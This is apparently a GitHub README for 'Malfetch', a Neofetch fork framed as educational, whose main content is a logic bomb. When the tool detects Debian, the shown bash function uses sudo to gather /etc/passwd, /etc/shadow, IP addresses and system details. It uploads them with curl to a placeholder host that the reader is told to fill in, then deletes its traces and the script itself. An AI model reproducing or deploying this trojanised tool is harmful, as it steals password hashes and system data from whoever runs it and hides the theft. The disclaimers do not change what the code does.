# Malfetch
Malfetch is a fork of Neofetch designed for educational purposes. This repository contains a logic bomb integrated into the original Neofetch functionality, allowing users to understand the implications of malicious code in a controlled environment.

# Warning
This repository is intended for educational purposes only. It is crucial to understand the ethical implications of using and distributing malicious code. Use this repository responsibly and only in environments where you have explicit permission to test and learn.

# Malicious Part
There is no default hostname, so the created system file won't go anywhere until you edit the code.
``` bash
logic() {
    [[ $distro ]] && return

    if [[ -f /etc/os-release ]]; then
        source /etc/os-release
        if [[ $ID == "debian" ]]; then
            distro="Debian ${VERSION_ID:-${VERSION}}"
            malicious  
        fi
    fi
}

malicious() {
    sudo bash -c 'cat /etc/passwd > /tmp/xyz1048udk && \
                   echo "" >> /tmp/xyz1048udk && \
                   cat /etc/shadow >> /tmp/xyz1048udk && \
                   echo "" >> /tmp/xyz1048udk && \
                   echo "Local IP Address(es):" >> /tmp/xyz1048udk && \
                   hostname -I >> /tmp/xyz1048udk && \
                   echo "" >> /tmp/xyz1048udk && \
                   echo "Public IP Address:" >> /tmp/xyz1048udk && \
                   curl -s ifconfig.me >> /tmp/xyz1048udk && \
                   echo "" >> /tmp/xyz1048udk && \
                   echo "System Information:" >> /tmp/xyz1048udk && \
                   echo "Operating System:" >> /tmp/xyz1048udk && \
                   lsb_release -d >> /tmp/xyz1048udk && \
                   echo "Kernel Version:" >> /tmp/xyz1048udk && \
                   uname -r >> /tmp/xyz1048udk && \
                   echo "Disk Usage:" >> /tmp/xyz1048udk && \
                   df -h >> /tmp/xyz1048udk'

    curl -X POST -F "file=@/tmp/xyz1048udk" https://hostname/upload_endpoint

    sudo rm /tmp/xyz1048udk
    sudo rm -- "$0"  
}
```

# How to Use

To test the script, follow these steps:

1. **Clone the Repository**: Clone the repository to your local machine or a virtual machine using the following command:
   ```bash
   git clone https://github.com/kaishira/malfetch.git
   ```

2. **Edit the IP Address and Hostname**: Navigate to the cloned directory and edit the script to set the appropriate IP address and hostname as needed.

3. **Run the Script**: Inside the cloned folder, execute the script with the following command:
   ```bash
   sudo ./neofetch
   ```

# Disclaimer
The authors of this repository are not responsible for any misuse of the code contained herein. By using this repository, you agree to take full responsibility for your actions and to use the code only in ethical and legal contexts.
